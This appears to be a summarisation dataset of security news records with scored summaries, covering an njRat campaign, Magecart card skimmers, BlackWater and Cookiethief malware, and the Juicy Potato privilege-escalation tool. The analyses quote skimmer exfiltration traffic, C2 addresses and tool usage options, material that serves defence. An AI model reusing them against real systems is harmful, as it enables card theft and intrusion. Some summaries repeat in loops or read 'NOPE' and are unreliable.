+RC4+ Poly AES +Gzip Builder 07-01-2015\obj\x86\Release\explorer.pdb C:\Users\pc\Desktop\xxxxx\ALL PolyRSM +RC4+ Poly AES +Gzip StrReverse 11-01-2019\PolyRSM +RC4+ Poly AES +Gzip Builder StrReverse 11-01-2019\obj\x86\Release\explorer.pdb C:\Users\pc\Desktop\03-02-2020\ZIP RC2 RC4\decode\WindowsApplication6\obj\Release\explorer.pdb C:\Users\pc\Desktop\03-02-2020\NEW 3DES ZIP 29-01-2020\decode\WindowsApplication6\obj\Release\taskhost.pdbThese are just four examples out of hundreds of files. It's worth noting that each example has different dates. Some are very recent, while others are from a few years ago. This suggests that compilation of these malicious files is automated.The DomainUntil June 2018, it seems capeturk.com was a Turkish gaming website dedicated to the well-known game Minecraft. On November 25 2018, the capeturk.com domain expired and was registered by a Vietnamese individual. The domain started to be associated with malware around the time of the re-registration, however, it is unclear whether this Vietnamese individual has any ties to the malware campaign. That being said, it seems someone from Vietnam is constantly testing the samples by submitting them to VirusTotal. We suspect this individual is tied to the Vietnamese domain ownership:VirusTotal submissions page from one of the samples.Important note: According to the highlighted path from the submission information and the win7x64 username in the path, this is some sort of test machine. Additionally, this sample was submitted from Vietnam.Multiple campaigns and targets?After examining different samples submitted to different subdomains of capeturk.com (as detailed in the IOCs section of this writeup) it appears that each subdomain is targeting different software and therefore a different set of victims. While all of the samples associated with blog.capeturk.com are targeting various penetration testing and hacking tools, other subdomains are targeting Chrome installers, native Windows applications, and other random programs that have nothing to do with hacking or penetration testing.For example, this sample which is connecting to 6666.elitfilmizle.com, is another njRat payload pretending to be an NVIDIA service:Another important behavior to note is that the numbers in the subdomain (6666, 7777, etc) correspond to the port on which the C2 server is running on the host. For example, 6666.elitfilmizle.com has port 6666 listening on it, 7777.elitfilmizle.com has port 7777, and so on.ConclusionThis investigation surfaced almost 1000 njRat samples compiled and built on almost a daily basis. It is safe to assume that many individuals have been infected by this campaign (although at the moment we are unable to know exactly how many). This campaign ultimately gives threat actors complete access to the target machine, so they can use it for anything from conducting DDoS attacks to stealing sensitive data off the machine.It is clear the threat actors behind this campaign are using multiple servers, some of which appear to be hacked WordPress blogs. Others appear to be the infrastructure owned by the threat group, judging by multiple hostnames, DNS data, etc.At the moment, we are unable to ascertain the other victims this malware campaign is targeting, other than those targeted by the trojanized hacking tools connecting to the ""7777 server"". We will continue to monitor this campaign for any further developments.Check out how we use MITRE ATT&CK to identify and categorize threats like Operation Soft Cell in our webinar with the MITRE ATT&CK team.Indicators of CompromiseClick here to download this campaign's IOCs (PDF)MITRE ATT&CK BREAKDOWNClick here to view the njRat Threat Alert or browse our existing threat alerts below.";"The malware is spreading by turning various hacking tools and other installers into trojans. The threat actors are posting the maliciously modified files on various forums and websites to bait other hackers. It seems as if the threat actors behind this campaign are building new iterations of their hacking tools on a daily basis. This njRat campaign is targeting WordPresspowered websites. The attackers are deploying various hacking and penetration tools in various paths on the target machine. The attackers are also deploying a fake explorer.exe (the njRat payload) that runs a netsh command to communicate to the outside world. It appears that capeturk.com was a Turkish gaming website dedicated to the wellknown game Minecraft. This investigation surfaced almost 1000 njRat samples compiled and built on almost a daily basis. It is safe to assume that many individuals have been infected by this campaign (although at the moment we are unable to know exactly how many). This campaign ultimately gives threat actors complete access to the target machine, so they can use it for anything from conducting DDoS attacks to stealing sensitive data off the machine.It is clear the threat actors behind this campaign are using multiple servers, some of which appear to be hacked WordPress blogs. Others appear to be the infrastructure owned by the threat group, judging by multiple hostnames, DNS data, etc.At the moment, we are unable to ascertain the other victims this malware campaign is targeting, other than those targeted by the trojanized hacking tools connecting to the ""7777 server"". We will continue to monitor this campaign for any further developments.Check out how we use MITRE ATT&CK to identify and categorize threats like Operation Soft Cell in our webinar with the MITRE ATT&CK";en;{'r': 0.20556227327690446, 'p': 0.9770114942528736, 'f': 0.339660336788127};{'r': 0.13659942363112393, 'p': 0.915057915057915, 'f': 0.23771313715788797};{'r': 0.20556227327690446, 'p': 0.9770114942528736, 'f': 0.339660336788127}
https://www.malwarebytes.com/blog/news/2020/03/rocket-loader-skimmer-impersonates-cloudflare-library-in-clever-scheme;Rocket Loader skimmer impersonates CloudFlare library in clever scheme;"Posted: March 10, 2020 byURLs can be deceiving, but the one used to mimic CloudFlare's Rocket Loader in the latest Magecart attack takes it to a whole new level.Update: The digital certificate issued for https[.]ps has been revoked by GlobalSign.Fraudsters are known for using social engineering tricks to dupe their victims, often times by impersonating authority figures to instill trust.In a recent blog post, we noted how criminals behind Magecart skimmers mimicked content delivery networks in order to hide their payload. This time, we are looking at a far more clever scheme.This latest skimmer is disguised as a JavaScript file that appears to be CloudFlare's Rocket Loader, a library used to improve page load time. The attackers created an almost authentic replica by registering a specially crafted domain name.This campaign has been affecting a number of e-commerce sites and shows threat actors will continue to come up with ingenious ways to deceive security analysts and website administrators alike.Decoy Rocket LoaderOn a compromised Magento site, we noticed that attackers had injected a script purporting to be the Rocket Loader library. In fact, we can see two almost identical versions loaded side by side.If we look at their source code, we find that the two scripts are quite different. One of them is obfuscated, while the other is recognizable as the legitimate CloudFlare Rocket Loader library.There is a subtle difference in the URI path loading both scripts. The malicious one uses a clever way to turn the domain name http.ps (note the dot '.' , extra 'p' and double slash '//') into something that looks like 'https://'. The threat actors are taking advantage of the fact that since Google Chrome version 76, the ""https"" scheme (and special-case subdomain ""www"") is no longer shown to users.To reveal the full URL with its protocol, you can double click inside the address bar. In other browsers such as Firefox or Edge, the default is to show the entire URL. That makes this attack a little more obvious and therefore less effective if you were a site administrator investigating this library.Active skimmer campaignThe Palestinian National Internet Naming Authority (PNINA) is the official domain registry for the .ps country code Top-Level-Domain (ccTLD). The decoy domain http.ps was registered on 2020-02-07 via the Key-Systems GmbH registrar.In mid-February, security researcher Willem de Groot tweeted about how this domain was being used for credit card skimming in an ongoing campaign with the additional ""e4[.]ms"" domain.The skimmer code as well as its exfiltration gate (autocapital[.]pw), were described by Denis Sinegubko, a security researcher at GoDaddy/Sucuri.There are two ways e-commerce sites are being compromised:Skimming code that is injected into a self hosted JavaScript library (the jQuery library seems to be the most targeted)A script that references an external JavaScript, hosted on a malicious siteThe first version of the skimmer used in this campaign is the hex obfuscated type with data exfiltration via autocapital[.]pw as seen in the decoy Rocket Loader library. As Denis mentioned in his tweet, this skimmer contains an English and Portuguese version (urlscan.io archive here).The other version of the skimmer (hosted on e4[.]ms) uses a different obfuscation scheme with data exfiltration via xxx-club[.]pw (this domain is on the same server as the autocapital[.]pw exfiltration gate).We recognize this obfuscation pattern as 'Radix', from a previous campaign described and tracked by Sucuri since 2016. Given the naming convention used for the domains and skimmers, we believe the same threat actors may be behind this newest wave of attacks.Patching and proactive securityThis kind of attack reinforces the importance of good website security. The majority of compromises happen on sites that have not been updated or that use weak login credentials. These days, other forms of defense include web application firewalls and general hardening of the CMS and its server.The majority of consumers that shop on a compromised site will have no idea that something went wrong until it's too late. Even though it is the responsibility of the merchant to ensure their platform is secure, it is obvious that additional containment needs to be taken by visitors themselves.Malwarebytes users are protected against this credit card skimming attack via our web protection layer in Malwarebytes for consumers and businesses.We have reached out to the registrar and certificate authority but at the time of writing the malicious decoy domain is still active.Indicators of compromiseSkimmers and gateshttp[.]ps autocapital[.]pw xxx-club[.]pw e4[.]ms y5[.]ms83.166.248[.]6783.166.244[.]189";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.malwarebytes.com/blog/news/2020/02/fraudsters-cloak-credit-card-skimmer-with-fake-content-delivery-network-ngrok-server;Fraudsters cloak credit card skimmer with fake content delivery network, ngrok server;Posted: February 26, 2020 byCriminals set up fraudulent infrastructure that looks like a typical content delivery network--except it isn't. Behind it hides a credit card skimmer injected into Magento online stores.Threat actors love to abuse legitimate brands and infrastructure--this, we know. Last year we exposed how web skimmers had found their way onto Amazon's Cloudfront content delivery network (CDN) via insecure S3 buckets. Now, we discovered scammers pretending to be CDNs while exfiltrating data and hiding their tracks--another reason to keep watchful eye on third-party content.Sometimes, what looks like a CDN may turn out to be anything but. Using lookalike domains is nothing new among malware authors. One trend we see a fair bit with web skimmers in particular is domains that mimic Google Analytics: Practically all websites use this service for their ranking and statistics, so it makes for credible copycats.In the latest case, we caught scammers using two different domains pretending to be a CDN. While typically the second piece of the infrastructure is used for data exfiltration, it only acts as an intermediary that attempts to hide the actual exfiltration server.Oddly, the crooks decided to use a local web server exposed to the Internet via the free ngrok service--a reverse proxy software that creates secure tunnels--to collect the stolen data. This combination of tricks and technologies shows us that fraudsters can devise custom schemes in an attempt to evade detection.Inspecting code for unauthorized third-partiesWe identified suspicious code on the website for a popular Parisian boutique store. However, to the naked eye, the script in question looks just like another jQuery library loaded from a third-party CDN.Figure 1: Compromised online store, with source code showing a CDN like domainAlthough the domain name (cdn-sources[.]org) alludes to a CDN, and unveil.js is a legitimate library, a quick look at the content shows some inconsistencies. There should not be fields looking for a credit card number for this kind of plugin.Figure 2: A malicious third-party library impersonating a legitimate oneTo clear any doubts, we decided to check an archived copy of the site and compared it with a live snapshot. We can indeed see that this script did not exist just a couple of weeks prior. Either it was added by the site owner, or in this case, injected by attackers.Figure 3: Snapshots comparing online store before and after the hackThe script checks for the current URL in the address bar and if it matches with that of a checkout page, it begins collecting form data. This typically includes the shopper's name, address, email, phone number, and credit card information.Figure 4: Another fake CDN domain used as part of the data exfiltration processData exfiltration via ngrok serverOnce this data is collected, the skimmer will exfiltrate it to a remote location. Here, we see yet another CDN lookalike in cdn-mediafiles[.]org. However, after checking the network traffic, we noticed this is not the actual exfiltration domain, but simply an intermediary.GET https://cdn-mediafiles.org/cache.php HTTP/1.1 Host: cdn-mediafiles.org Connection: keep-alive Accept: / Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Referer: https://www.{removed}.com/checkout/onepage/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en,q=0.9 HTTP/1.1 200 OK Content-Type: text/html, charset=UTF-8 Connection: keep-alive Content-Length: 36 Ly9kNjgzNDRmYi5uZ3Jvay5pby9hZC5waHA=Instead, the GET request returns a Base64 encoded response. This string, which was already present in the original skimmer script, decodes to //d68344fb.ngrok[.]io/ad.php which turns out to be the actual exfiltration server.Figure 5: Customer data being stolen and exfiltrated to ngrok serverNgrok is software that can expose a local machine to the outside as if it was an external server. Users can create a free account and get a public URL. Crooks have abused ngrok to exfiltrate credit card data before.To summarize, the compromised e-commerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect.Figure 6: Traffic flow, from skimming to data exfiltrationThe above view is simplified, only keeping the key elements responsible for the skimming activity. In practice, network captures will contain hundreds more sequences that will make it more difficult to isolate the actual malicious activity.Blocking and reportingWe caught this campaign early on, and at the time only a handful of sites had been injected with the skimmer. We reported it to the affected parties while also making sure that Malwarebytes users were protected against it.Figure 7: Malwarebytes blocking the skimmer on the checkout pageThreat actors know they typically have a small window of opportunity before their infrastructure gets detected and possibly shutdown. They can devise clever tricks to mask their activity in addition to using domains that are either fresh or belong to legitimate (but abused) owners.While these breaches hurt the reputation of online merchants, customers also suffer the consequences of a hack. Not only do they have to go through the hassle of getting new credit cards, their identities are stolen as well, opening the door to future phishing attacks and impersonation attempts.Indicators of CompromiseWeb skimmer domaincdn-sources[.]orgWeb skimmer scriptscdn-sources[.]org/jquery.unveil.jscdn-sources[.]org/adrum-4.4.3.717.jscdn-sources[.]org/jquery.social.share.2.2.min.jsRedirectcdn-mediafiles[.]org/cache.phpExfiltration URLd68344fb.ngrok[.]io/ad.php;The ITSecurity report has been summarized. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce site loads a skimmer from a domain made to look like a CDN. Data is collected when a shopper is about to make a payment and sent to a custom ngrok server after a simple redirect. The compromised ecommerce;en;{'r': 0.05930470347648262, 'p': 0.8285714285714286, 'f': 0.11068702165411398};{'r': 0.04257907542579075, 'p': 0.7777777777777778, 'f': 0.08073817663980715};{'r': 0.05930470347648262, 'p': 0.8285714285714286, 'f': 0.11068702165411398}
https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/;BlackWater Malware Abuses Cloudflare Workers for C2 Communication;"A new backdoor malware called BlackWater pretending to be COVID-19 information while abusing Cloudflare Workers as an interface to the malware's command and control (C2) server.Cloudflare Workers are JavaScript programs that run directly on Cloudflare's edge so that they can interact with connections from remote web clients. These Workers can be used to modify the output of a web site behind Cloudflare, disable Cloudflare features, or even act as independent JavaScript programs running on the edge that displays output.For example, a Cloudflare Worker can be created to search for text in a web server's output and replace words in it or to simply output data back to a web client.BlackWater uses Cloudflare Workers as a C2 interfaceRecently MalwareHunterTeam discovered a RAR file being distributed pretending to be information about the Coronavirus (COVID-19) called ""Important - COVID-19.rar"".It is not known at this time how the file is being distributed, but it is most likely being done through phishing emails.Inside this RAR file is a file called ""Important - COVID-19.docx.exe"" that uses a Word icon. Unfortunately, as Microsoft hides file extensions by default, many will simply see this file as a Word document rather than an executable and be more likely to open it.Extracted file with extensions off and onWhen opened, the malware will extract a Word document to the %UserProfile%\downloads folder called ""Important - COVID-19.docx.docx"" and opens it in Word.The opened document is a document containing information on the COVID-19 virus and is being used by the malware as a decoy as it installs the rest of the malware and executes it on the computer.Decoy COVID-19 Information DocumentWhile victims are reading the COVID-19 document, the malware is also extracting the %UserProfile%\AppData\Local\Library SQL\bin\version 5.0\sqltuner.exe file.This is where things get a bit interesting as the malware is then launched using a command line that causes the BlackWater malware to connect to a Cloudflare Worker that acts as a command and control server or at least a passthrough to one.sqltuner.exe lively-dream-c871.m7.workers.devIf visiting this site directly, users will be shown the following 'HellCat' image.Cloudflare workerHead of SentinelLabs Vitali Kremez told BleepingComputer that this worker is a front end to a ReactJS Strapi App that acts as a command and control server.Kremez stated that this C2 will respond with a JSON encoded string that may contain commands to execute when the malware connects to it with the right authentication parameters.The BlackWater malware is, by and large, a newer generation malware taking advantage of the ReactJS Strapi App for the backend checking, leveraging Cloudflare workers resolvers and employing JSON-based parser inside its DLL passing the server argument directly. The check-ins bear the ""blackwater"" marker as well passing either email @ black.water or @ black64.water depending on the architecture. The malware appears to be novel and its JSON-based parser with the newer generation ReactJS backend server architecture is indicative of the active development amid the CoronaVirus outbreak.When we asked why they were using a Cloudflare Worker rather than connecting directly to the C2, Kremez felt it was to make it harder to for security software to block IP traffic without blocking all of Cloudflare's Worker infrastructure.""I think this is why they employ as it returns back the legit Cloudflare proxy IP which acts as a reverse proxy passing the traffic to the C2. It makes blocking the IP traffic impossible given it is Cloudflare (unless the whole Cloudflare worker space is banned) infrastructure while hiding the actual C2.""While there is still plenty to learn about this new malware and how it operates, it does provide an interesting glimpse of how malware developers are utilizing legitimate cloud infrastructure in novel ways.Using Cloud Workers, traffic to malware command & control servers become harder to block and the malware operation can be easily scaled as needed.";"A new backdoor malware called BlackWater pretending to be COVID19 information while abusing Cloudflare Workers as an interface to the malware's command and control (C2) server.Cloudflare Workers are JavaScript programs that run directly on Cloudflare's edge so that they can interact with connections from remote web clients. These Workers can be used to modify the output of a web site behind Cloudflare, disable Cloudflare features, or even act as independent JavaScript programs running on the edge that displays output.For example, a Cloudflare Worker can be created to search for text in a web server's output and replace words in it or to simply output data back to a web client.BlackWater uses Cloudflare Workers as a C2 interfaceRecently MalwareHunterTeam discovered a RAR file being distributed pretending to be information about the Coronavirus (COVID19) called ""Important COVID19.rar"".It is not known at this time how the file is being distributed, but it is most likely being done through phishing emails.Inside this RAR file is a file called ""Important COVID19.docx.exe"" that uses a Word icon. Unfortunately, as Microsoft hides file extensions by default, many will simply see this file as a Word document rather than an executable and be more likely to open it.Extracted file with extensions off and onWhen opened, the malware will extract a Word document to the %UserProfile%\downloads folder called ""Important COVID19.docx.docx"" and opens it in Word.The opened document is a document containing information on the COVID19 virus and is being used by the malware as a decoy as it installs the rest of the malware and executes it on the computer.Decoy";en;{'r': 0.46006389776357826, 'p': 0.9863013698630136, 'f': 0.6274509760540343};{'r': 0.4118673647469459, 'p': 0.963265306122449, 'f': 0.5770171107183422};{'r': 0.46006389776357826, 'p': 0.9863013698630136, 'f': 0.6274509760540343}
https://securelist.com/cookiethief/96332/;Cookiethief: a cookie-stealing Trojan for Android;"We recently discovered a new strain of Android malware. The Trojan (detected as: Trojan-Spy.AndroidOS.Cookiethief) turned out to be quite simple. Its main task was to acquire root rights on the victim device, and transfer cookies used by the browser and Facebook app to the cybercriminals' server. This abuse technique is possible not because of a vulnerability in Facebook app or browser itself. Malware could steal cookie files of any website from other apps in the same way and achieve similar results.How can stealing cookies be dangerous? Besides various settings, web services use them to store on the device a unique session ID that can identify the user without a password and login. This way, a cybercriminal armed with a cookie can pass himself off as the unsuspecting victim and use the latter's account for personal gain.Package name of the Cookiethief malware -- com.lob.roblox, which is similar to that of the Roblox Android gaming client (com.roblox.client), but has nothing in common with Roblox.Malicious features of Trojan-Spy.AndroidOS.CookiethiefTo execute superuser commands, the malware connects to a backdoor installed on the same smartphone......and passes it a shell command for execution.The backdoor Bood, located at the path /system/bin/.bood, launches the local server......and executes commands received from Cookiethief.On the C&C server we also found a page advertising services for distributing spam on social networks and messengers, so it was not difficult to guess the motive behind the cookie-theft operation.But there's still a hurdle for the spammers that prevents them from gaining instant access to accounts just like that. For example, if Facebook detects an atypical user activity, the account may be blocked.However, during our analysis of Cookiethief, we uncovered another malicious app with a very similar coding style and the same C&C server. The second ""product"" from (presumably) the same developers (detected as: Trojan-Proxy.AndroidOS.Youzicheng) runs a proxy on the victim's device.We believe that Youzicheng is tasked with bypassing the security systems of the relevant messenger or social network using a proxy server on the victim's device. As a result, cybercriminals' request to the website will look like a request from a legitimate account and not arouse suspicion.To implement this method, an executable file is first downloaded.Then the proxy configuration is requested.The downloaded file is then run.By combining these two attacks, cybercriminals can gain complete control over the victim's account and not raise a suspicion from Facebook. These threats are only just starting to spread, and the number of victims, according to our data, does not exceed 1000, but the figure is growing.Through the C&C server addresses and encryption keys used, Cookiethief can be linked with such widespread Trojans as Sivu, Triada, and Ztorg. Usually, such malware is either planted in the device firmware before purchase, or it gets into system folders through vulnerabilities in the operating system and then can download various applications into the system. As a result, a persistent backdoor like Bood, along with the auxiliary programs Cookiethief and Youzicheng, can end up on the device.We detect com.lob.roblox as HEUR:Trojan-Spy.AndroidOS.Cookiethief, org.rabbit as HEUR:Trojan-Proxy.AndroidOS.Youzicheng, and Bood as HEUR:Backdoor.AndroidOS.Bood.a.IOCs";A new strain of Android malware has been discovered. The Trojan (detected as: TrojanSpy.AndroidOS.Cookiethief) turns out to be quite simple. Its main task is to acquire root rights on the victim device, and transfer cookies used by the browser and Facebook app to the cybercriminals' server. This abuse technique is possible not because of a vulnerability in Facebook app or browser itself. Malware could steal cookie files of any website from other apps in the same way and achieve similar results. How can stealing cookies be dangerous? Besides various settings, web services use them to store on the device a unique session ID that can identify the user without a password and login. This way, a cybercriminal armed with a cookie can pass himself off as the unsuspecting victim and use the latter's account for personal gain. Package name of the Cookiethief malware com.lob.roblox, which is similar to that of the Roblox Android gaming client (com.roblox.client), but has nothing in common with Roblox. Malicious features of TrojanSpy.AndroidOS.Cookiethief To execute superuser commands, the malware connects to a backdoor installed on the same smartphone......and passes it a shell command for execution. The backdoor Bood, located at the path /system/bin/.bood, launches the local server......and executes commands received from Cookiethief. On the C&C server we also found a page advertising services for distributing spam on social networks and messengers, so it was not difficult to guess the motive behind the cookietheft operation. But there's still a hurdle for the spammers that prevents them from gaining instant access to accounts just like that. For example, if Facebook detect;en;{'r': 0.5798045602605864, 'p': 0.9726775956284153, 'f': 0.7265306075650979};{'r': 0.4901185770750988, 'p': 0.9288389513108615, 'f': 0.6416558816358036};{'r': 0.5765472312703583, 'p': 0.9672131147540983, 'f': 0.7224489749120366}
https://www.zdnet.com/article/android-malware-tweaks-expose-devices-to-browser-app-cookie-theft/;Cookiethief Android malware uses proxies to hijack your Facebook account;"A combination of new modifications to Android malware code has given rise to Trojans able to steal browser and app cookies from compromised devices.On Thursday, researchers from Kaspersky said the new malware families, dubbed Cookiethief, use a combination of exploits to acquire root rights to an Android device and then to steal Facebook cookie data.Cookies are tiny pieces of data that are collected by websites, online services, and mobile applications in order to track users. This information may be used for marketing purposes -- including the creation of personalized content or ad recommendations -- to track user engagement, or to compile wider datasets on consumers, such as their purchase patterns and interests.Cookies are not generally considered harmful, albeit a nuisance and potentially privacy-eroding. However, when they are stored by websites and used to generate unique session IDs to allow users to stay logged in to a service, their loss may be a security risk.See also: Critical XSS vulnerability patched in WordPress plugin GDPR Cookie ConsentThreat actors may be able to fool a website into believing they are legitimate account holders, leading to account compromise, data theft, and potentially hijacking. There are security measures that can prevent these scenarios, however, the new malware's bag of tricks attempts to circumvent them.Kaspersky isn't entirely sure how Cookiethief has landed on devices already showing signs of infection -- at the last count being roughly 1,000, a figure that is climbing -- but once the Trojan does, the first stage of the attack is to acquire root rights on an Android mobile device.In the cases documented by Kaspersky, Facebook cookies are the prime target. The team is keen to emphasize that there does not appear to be a vulnerability in the Facebook app or mobile browsers that permits the theft and malware intrusion.The Bood backdoor is installed at the time of infection which connects to a command-and-control (C2) server and shell commands are passed for ""superuser"" command execution and cookie theft.CNET: US must do more to stop cyberattacks, bipartisan commission findsHowever, stealing cookies is not enough to gain Facebook account access, as any suspicious activity could result in accounts being automatically blocked. This is where Cookiethief's second stage comes in.During analysis, the team found a second branch of the malware with similar coding and the same C2 server connection. This malware launches a proxy on the victim device to make access requests appear legitimate.""By combining these two attacks, cybercriminals can gain complete control over the victim's account and not raise suspicion from Facebook,"" the team says. ""From there, the criminals can pose as the victim and take control of their social networking account to distribute undesirable content.""TechRepublic: Biggest trends for 5G as infrastructure to hit $4.2 billionThe content in question is likely spam or the distribution of malicious links. A webpage stored on the fraudster's C2 advertises social network account and messenger distribution services, and so the researchers believe the Trojan could be the result of efforts to spread spam and phishing attacks.Kaspersky says that Cookiethief may also be connected to existing Trojans including Sivu, Triada, and Ztorg, which are generally embedded into firmware or deployed through operating system vulnerabilities.10 worst hacks and data breaches of 2019 (in pictures)Previous and related coverageHave a tip? Get in touch securely via WhatsApp | Signal at +447713 025 499, or over at Keybase: charlie0";"Kaspersky has identified a new malware family, dubbed Cookiethief, which uses a combination of exploits to acquire root rights to an Android device and then to steal Facebook cookie data. Cookies are tiny pieces of data that are collected by websites, online services, and mobile applications in order to track users. This information may be used for marketing purposes including the creation of personalized content or ad recommendations to track user engagement, or to compile wider datasets on consumers, such as their purchase patterns and interests. Cookies are not generally considered harmful, albeit a nuisance and potentially privacyeroding. However, when they are stored by websites and used to generate unique session IDs to allow users to stay logged in to a service, their loss may be a security risk. See also: Critical XSS vulnerability patched in WordPress plugin GDPR Cookie Consent Threat actors may be able to fool a website into believing they are legitimate account holders, leading to account compromise, data theft, and potentially hijacking. There are security measures that can prevent these scenarios; however, the new malware's bag of tricks attempts to circumvent them. Kaspersky isn't entirely sure how Cookiethief has landed on devices already showing signs of infection at the last count being roughly 1,000, a figure that is climbing but once the Trojan does, the first stage of the attack is to acquire root rights on an Android mobile device. In the cases documented by Kaspersky, Facebook cookies are the prime target. The team is keen to emphasize that there does not appear to be a vulnerability in the Facebook app or mobile browsers that permits the theft and malware intrusion. The Bood backdoor is installed at the time of infection which connects to";en;{'r': 0.5377643504531722, 'p': 0.9621621621621622, 'f': 0.6899224760204464};{'r': 0.46691176470588236, 'p': 0.927007299270073, 'f': 0.6210268904102678};{'r': 0.5377643504531722, 'p': 0.9621621621621622, 'f': 0.6899224760204464}
http://ohpe.it/juicy-potato/;Juicy Potato (abusing the golden privileges);"Juicy Potato (abusing the golden privileges)A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEMSummaryRottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges. During a Windows build review we found a setup where BITS was intentionally disabled and port 6666 was taken.We decided to weaponize RottenPotatoNG: Say hello to Juicy Potato.For the theory, see Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM and follow the chain of links and references.We discovered that, other than BITS there are a several COM servers we can abuse. They just need to:be instantiable by the current user, normally a ""service user"" which has impersonation privileges implement the IMarshal interface run as an elevated user (SYSTEM, Administrator, ...)After some testing we obtained and tested an extensive list of interesting CLSID's on several Windows versions.Juicy detailsJuicyPotato allows you to:Target CLSIDpick any CLSID you want. Here you can find the list organized by OS.COM Listening portdefine COM listening port you prefer (instead of the marshalled hardcoded 6666)COM Listening IP addressbind the server on any IPProcess creation modedepending on the impersonated user's privileges you can choose from: CreateProcessWithToken (needs SeImpersonate ) CreateProcessAsUser (needs SeAssignPrimaryToken ) bothdepending on the impersonated user's privileges you can choose from: Process to launchlaunch an executable or script if the exploitation succeedsProcess Argumentcustomize the launched process argumentsRPC Server addressfor a stealthy approach you can authenticate to an external RPC serverRPC Server portuseful if you want to authenticate to an external server and firewall is blocking port 135 ...TEST modemainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See here for testingUsageT:\>JuicyPotato.exe JuicyPotato v0.1 Mandatory args: -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both -p <program>: program to launch -l <port>: COM server listen port Optional args: -m <ip>: COM server listen address (default 127.0.0.1) -a <argument>: command line argument to pass to program (default NULL) -k <ip>: RPC server ip address (default 127.0.0.1) -n <port>: RPC server listen port (default 135) -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) -z only test CLSID and print token's userExampleFinal thoughtsIf the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.It's nearly impossible to prevent the abuse of all these COM Servers. You could think to modify the permissions of these objects via DCOMCNFG but good luck, this is gonna be challenging.The actual solution is to protect sensitive accounts and applications which run under the * SERVICE accounts. Stopping DCOM would certainly inhibit this exploit but could have a serious impact on the underlying OS.BinariesAn automatic build is available. Binaries can be downloaded from the Artifacts section here.Also available in BlackArch.AuthorsReferences";JuicyPotato allows you to:Target CLSIDpick any CLSID you want. Here you can find the list organized by OS.COM Listening portdefine COM listening port you prefer (instead of the marshalled hardcoded 6666)COM Listening IP addressbind the server on any IPProcess creation modedepending on the impersonated user's privileges you can choose from: CreateProcessWithToken (needs SeImpersonate ) CreateProcessAsUser (needs SeAssignPrimaryToken ) bothdepending on the impersonated user's privileges you can choose from: Process to launchlaunch an executable or script if the exploitation succeedsProcess Argumentcustomize the launched process argumentsRPC Server addressfor a stealthy approach you can authenticate to an external RPC serverRPC Server portuseful if you want to authenticate to an external server and firewall is blocking port 135 ...TEST modemainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See here for testingUsageT:\>JuicyPotato.exe JuicyPotato v0.1 Mandatory args: t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both p <program>: program to launch l <port>: COM server listen port Optional args: m <ip>: COM server listen address (default 127.0.0.1) a <argument>: command line argument to pass to program (default NULL) k <ip>: RPC server ip address (default 127.0.0.1) n <port>: RPC server listen port (default 135) c <{clsid}>: CLSID (default BITS;en;{'r': 0.42953020134228187, 'p': 0.9481481481481482, 'f': 0.5912240141842988};{'r': 0.376940133037694, 'p': 0.9042553191489362, 'f': 0.5320813729987927};{'r': 0.42953020134228187, 'p': 0.9481481481481482, 'f': 0.5912240141842988}
https://securelist.com/apt-phantomlance/96772/;Hiding in plain sight: PhantomLance walks into a market;"In July 2019, Dr. Web reported about a backdoor trojan in Google Play, which appeared to be sophisticated and unlike common malware often uploaded for stealing victims' money or displaying ads. So, we conducted an inquiry of our own, discovering a long-term campaign, which we dubbed ""PhantomLance"", its earliest registered domain dating back to December 2015. We found dozens of related samples that had been appearing in the wild since 2016 and had been deployed in various application marketplaces including Google Play. One of the latest samples was published on the official Android market on November 6, 2019. We informed Google of the malware, and it was removed from the market shortly after.The latest example of spyware in Google Play disguised as a browser cleanerDuring our investigation, we discovered various overlaps with reported OceanLotus APT campaigns. Thus, we found multiple code similarities with the previous Android campaign, as well as macOS backdoors, infrastructure overlaps with Windows backdoors and a few cross-platform resemblances.Besides the attribution details, this document describes the actors' spreading strategy, their techniques for bypassing app market filters, malware version diversity and the latest sample deployed in 2020, which uses Firebase to decrypt the malicious payload. We also found out that Blackberry Cylance research team investigated this activity.Our report is broken down into several sections.Malware versions - technical description of versions found, their features and relationships between them. Spread - information on specific tactics used by the threat actors for distributing their malware. Infrastructure - further details on uncovered infrastructure pieces as well as overlaps found. Victimology - thoughts on the actors' interests in choosing their targets. Overlaps with previous campaigns - details of similarities with all related campaigns that we have identified.More information on PhantomLance is available to customers of Kaspersky Intelligence Reporting. For more information, contact intelreports@kaspersky.comMalware versionsFor the purposes of 